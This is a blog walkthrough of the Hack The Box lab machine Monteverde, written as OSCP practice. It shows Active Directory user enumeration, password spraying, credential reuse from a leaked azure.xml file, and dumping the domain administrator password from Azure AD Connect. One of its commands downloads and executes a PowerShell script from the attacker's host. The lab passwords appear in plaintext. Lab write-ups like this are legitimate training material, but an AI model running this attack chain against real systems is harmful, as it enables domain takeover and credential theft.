---
layout: post
title: HTB Monteverde
categories: [HTB, CF, OSCP]
---

Hello friend. Another AD machine from TJNull list. Let deep dive and learn something new...

```bash
$ nmap -sC -sV -O -oA nmap/detail-scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 10.10.10.172
# Nmap 7.91 scan initiated Wed Dec 22 00:40:03 2021 as: nmap -sC -sV -O -oA nmap/detail-scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.056s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-22 05:40:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-22T05:41:06
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 22 00:41:45 2021 -- 1 IP address (1 host up) scanned in 102.37 seconds
```
Check for zone transfer misconfiguration...

```
$ dig axfr @10.10.10.172 megabank.local

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.172 megabank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

I can connect and pull usernames from victim machine. 

```
 rpcclient -U "" 10.10.10.172 -N
rpcclient $> enumdomusers 
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $> 
```
Looking for some open shares...

```
$ smbmap -H 10.10.10.172                                  
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      

$ smbmap -H 10.10.10.172 -u ""                            
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
                                                                                             
$ smbmap -H 10.10.10.172 -u "guest"
[!] Authentication error on 10.10.10.172
```

At this point I tried to bruteforce username and password and see if someone use same password as username. Crackmapexec loops through all possible usernames and passwords. I would prefer **battling ram** attack similar to burpsuite has but no idea how to do it now. Something for my to-do learn list :)  

```
$ crackmapexec smb 10.10.10.172 -u username -p username --continue-on-success                                       
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE     
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE        
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE                                                                                                                                  
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE    
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE  
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE                                                                                                                                  
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE      
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED             
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE  
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE 

[snip..]
```
`SABatchJobs` username use same password for samba. Lets check what shares I have access to.

```
$ smbmap -H 10.10.10.172 -u "SABatchJobs" -p "SABatchJobs"                                                                                                                                                                         130 ⨯
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```

`azure_uploads` and `users$` looks really interesting. For unknown reason I started with `users$` one. I was hoping to get flag or more credentials :) 

```
$ smbclient -U "SABatchJobs" //10.10.10.172/users$        
Enter WORKGROUP\SABatchJobs's password:     
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                309503 blocks of size 4096. 304926 blocks available

```

Look I can list folders for some usernames. I download whole samba share back to my machine. and look for interesting files. 

```
$ tree . 
.
├── dgalanos
├── mhope
│   └── azure.xml
├── roleary
└── smorgan

4 directories, 1 file
```

Only one file `azure.xml`....

```
$ cat mhope/azure.xml 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

It contain password section. Let run crackmapexec with newly learned password, but now lets test again winrm protocol

```
$ crackmapexec winrm 10.10.10.172 -u username -p "4n0therD4y@n0th3r$" --continue-on-success
WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\:4n0therD4y@n0th3r$
```

`mhope` user use this password. Let log in into system. 

```
PS C:\Users\mhope\desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   12/25/2021 10:17:30 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
```

User us part of `Azure Admins`, there was `azure.xml` file and there is `azure_uploads` share too. This is quite a clues for privilege escalation, or really big rabbit hole. I found this article how to connect your on-promise AD to azure and how to abuse it. 
[link](https://blog.xpnsec.com/azuread-connect-for-redteam/)

I had to change first line to point not to file but local server. 
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

Run script...

```
PS C:\Users\mhope\desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.8/admin.ps1')
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

And I got password...

```
$ ~/tools/evil-winrm/evil-winrm.rb -u administrator -p d0m@in4dminyeah! -i 10.10.10.172

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```

It worked and I became administrator. Thank you for reading...




